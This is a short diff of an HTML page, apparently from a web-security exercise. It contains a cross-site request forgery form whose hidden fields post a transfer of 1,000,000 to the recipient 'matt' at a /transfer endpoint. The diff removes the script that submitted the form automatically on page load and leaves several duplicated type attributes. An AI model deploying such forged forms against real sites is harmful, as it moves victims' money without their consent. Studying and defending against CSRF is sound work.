@@ -8,14 +8,11 @@
 <body>
     <form action="/transfer" method="post">
         <label for="recipient" class="form-label">Recipient:</label>
-        <input type="hidden" type="text" placeholder="babbz" name="recipient" for="recipient"  value="matt">
-        <label for="amount" class="form-label">Amount:</label>
-        <input type="hidden" type="number"  name="amount"  placeholder="1000" value="1000000">
+        <input type="hidden" type="text" placeholder="babbz" name="recipient"  value="matt">
+        <label type="hidden" for="amount" class="form-label">Amount:</label>
+        <input type="hidden" type="hidden" type="number"  name="amount"  placeholder="1000" value="1000000">
         <button type="submit">Send</button>
     </form>
-<script>
-    document.forms[0].submit();
-</script>
 
 </body>
 </html>
